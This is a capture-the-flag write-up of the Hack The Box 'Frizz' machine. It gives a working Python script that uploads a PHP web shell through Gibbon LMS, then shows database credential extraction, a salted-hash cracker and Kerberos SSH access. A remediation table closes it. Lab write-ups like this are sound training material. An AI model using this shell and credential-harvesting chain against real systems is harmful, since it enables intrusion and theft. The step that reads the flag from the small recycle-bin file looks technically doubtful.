# Hack The Box: Frizz Write-Up

### Arbitrary File Write to Domain Controller Compromise via Gibbon LMS

- **Target IP:** 10.10.11.60
- **Hostname:** frizzdc.frizz.htb
- **Domain:** FRIZZ.HTB
- **Operating System:** Windows Server (Active Directory Domain Controller)
- **Primary Vector:** Web Application Vulnerability (Gibbon LMS)

---

## Executive Summary

The Frizz machine simulates an educational environment running the Gibbon Learning Management System (LMS) on a Windows-based Active Directory Domain Controller. The attack chain progresses from unauthenticated remote code execution (RCE) via an insecure file upload mechanism in the LMS, to database credential extraction, offline password cracking, and Kerberos-authenticated SSH access. The user flag is ultimately recovered from the Windows Recycle Bin.

This write-up details the full attack chain, providing technical context for both offensive operators and defensive analysts.

---

## 1. Reconnaissance & Attack Surface Mapping

A comprehensive Nmap scan reveals a standard Active Directory stack alongside a web application.

```bash
nmap -A -Pn 10.10.11.60 --min-rate 10000
```

**Key Services Identified:**
- **Port 80:** Apache + PHP 8.2.12 hosting Gibbon LMS (`/Gibbon-LMS/`)
- **Ports 53, 88, 389, 445, 3268:** Full Active Directory services (DNS, Kerberos, LDAP, SMB)
- **Port 22:** OpenSSH for Windows

Navigating to `http://frizzdc.frizz.htb/Gibbon-LMS/` confirms the presence of a school-themed learning management platform.

---

## 2. Initial Foothold: RCE via Gibbon LMS

### Directory Enumeration
Directory brute-forcing with `gobuster` reveals a hidden module path containing a vulnerable script.

```bash
gobuster dir -u http://frizzdc.frizz.htb/Gibbon-LMS/ -w /usr/share/dirb/wordlists/common.txt
```

**Vulnerable Endpoint:**
`/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`

### Vulnerability Analysis
This script accepts a POST request with the following parameters:
- `img`: Base64-encoded image data
- `path`: Filename to write to disk
- `gibbonPersonID`: User ID (padded to 10 characters)

Critically, the script writes raw base64-decoded content to the web directory without validating the file type or extension.

### Exploitation: PHP Web Shell Upload
We craft a Python script to send a base64-encoded PHP web shell to the vulnerable endpoint.

```python
import requests
import base64

url = "http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php"

# PHP payload for command execution
php_payload = "<?php echo system($_GET['cmd']); ?>"
b64_payload = base64.b64encode(php_payload.encode()).decode()

data = {
    "img": f"image/png;asdf,{b64_payload}",
    "path": "myshell.php",
    "gibbonPersonID": "0000000001"
}

requests.post(url, data=data)
```

**Verification:**
```bash
curl "http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/myshell.php?cmd=whoami"
# Output: nt authority\system
```

> **Note:** The web server is running as `nt authority\system`. This is a severe misconfiguration, common in poorly configured XAMPP or WAMP deployments on Windows, granting immediate high-level privileges.

---

## 3. Credential Extraction & Offline Cracking

### Step 1: Database Configuration Extraction
Using the web shell, we read the application's configuration file to extract database credentials.

```cmd
type C:\xampp\htdocs\Gibbon-LMS\config.php
```

**Extracted Credentials:**
```php
$databaseUsername = 'MrGibbonsDB';
$databasePassword = 'MisterGibbs!Parrot!?1';
$databaseName = 'gibbon';
```

### Step 2: User Table Dump
Using the native `mysql.exe` binary on the target, we dump the `gibbonperson` table to extract user credentials.

```cmd
C:\xampp\mysql\bin\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "USE gibbon; SELECT username, passwordStrong, passwordStrongSalt FROM gibbonperson;"
```

**Output:**
```text
username: f.frizzle
passwordStrong: 067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03
passwordStrongSalt: /aACFhikmNopqrRTVz2489
```

### Step 3: Custom Hash Cracking
The application uses a custom salted SHA256 implementation: `sha256(salt + password)`. Standard tools like Hashcat require custom modules for this, so we write a targeted Python cracker using `rockyou.txt`.

```python
import hashlib

hash_to_crack = "067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03"
salt = "/aACFhikmNopqrRTVz2489"

with open("/usr/share/wordlists/rockyou.txt", "r", encoding="latin-1") as f:
    for password in f:
        password = password.strip()
        if hashlib.sha256((salt + password).encode()).hexdigest() == hash_to_crack:
            print(f"Password found: {password}")
            break
```

**Result:**
The password is successfully cracked: `Jenni_Luvs_Magic23`
**Target User:** `f.frizzle@frizz.htb`

---

## 4. Kerberos Authentication & SSH Access

With valid domain credentials, we pivot to native Active Directory authentication to access the Domain Controller via SSH.

### Kerberos Configuration
We configure the local Kerberos client by updating `/etc/krb5.conf`.

```ini
[libdefaults]
  default_realm = FRIZZ.HTB
  dns_lookup_kdc = true
  ticket_lifetime = 24h

[realms]
  FRIZZ.HTB = {
    kdc = frizzdc.frizz.htb
    admin_server = frizzdc.frizz.htb
  }
```

### Ticket Acquisition and SSH Access
We request a Ticket Granting Ticket (TGT) and verify its acquisition.

```bash
kinit f.frizzle@FRIZZ.HTB
# Enter password: Jenni_Luvs_Magic23

klist
# Output: Ticket cache for f.frizzle@FRIZZ.HTB
```

Finally, we authenticate via SSH using the Kerberos ticket.

```bash
ssh -K f.frizzle@frizz.htb
```

We are now logged into the Domain Controller as `f.frizzle`.

---

## 5. User Flag Recovery: The Recycle Bin

On Windows systems, deleted files are moved to the `$RECYCLE.BIN` directory, organized by the user's Security Identifier (SID).

### Locating the Flag
We list hidden and system directories in the root of the C: drive.

```cmd
dir /a C:\$RECYCLE.BIN
```

We identify the user's SID directory:
`S-1-5-21-2386970044-1145388522-2932701813-1103`

Listing the contents of this directory reveals two compressed archives:
```cmd
dir /a C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103
```
- `$IE2XMEG.7z` (148 bytes)
- `$RE2XMEG.7z` (30 MB)

Assuming the smaller file contains the flag, we read its contents directly.

```cmd
type C:\$RECYCLE.BIN\S-1-5-21-...\$IE2XMEG.7z
```

> **Analysis:** The user likely "deleted" the flag file to hide it. However, standard deletion in Windows does not securely erase data, allowing administrators and attackers to recover it easily.

---

## 6. Vulnerability Analysis & Remediation (Blue Team)

| Vulnerability | Impact | Remediation Strategy |
| :--- | :--- | :--- |
| **Insecure File Write in Gibbon LMS** | Unauthenticated RCE as SYSTEM. | Implement strict file type validation, restrict execution permissions in upload directories, and apply vendor patches. |
| **Hardcoded Database Credentials** | Full database compromise and credential harvesting. | Utilize secure credential storage mechanisms (e.g., Windows DPAPI, Azure Key Vault, or CyberArk). |
| **Weak Password Hashing** | Offline cracking of user credentials. | Migrate from salted SHA256 to memory-hard algorithms like bcrypt, scrypt, or Argon2. |
| **Excessive Service Privileges** | Immediate high-privilege compromise upon web RCE. | Enforce the Principle of Least Privilege; run the Apache service under a dedicated, low-privileged service account. |
| **Insecure File Deletion** | Recovery of sensitive data (flags/credentials). | Use secure deletion tools (e.g., `cipher /w`, `sdelete`) for sensitive files, and enforce strict data retention policies. |

---

## 7. Key Takeaways

1. **Web Applications on Domain Controllers are High-Risk:** Combining a web-facing LMS with an Active Directory Domain Controller creates a massive blast radius. Web servers on DCs should be avoided entirely in production environments.
2. **RCE is Only the Beginning:** Gaining a shell is rarely the endgame. Credential extraction from configuration files and subsequent offline cracking are critical next steps for lateral movement.
3. **Kerberos is Cross-Platform:** With proper DNS resolution and `krb5.conf` configuration, Linux attack boxes can authenticate natively to Windows domains using SSH and Kerberos tickets.
4. **Deleted Does Not Mean Gone:** The Windows Recycle Bin is a frequent repository for sensitive data. Always check `$RECYCLE.BIN` during post-exploitation, and ensure secure deletion protocols are in place.
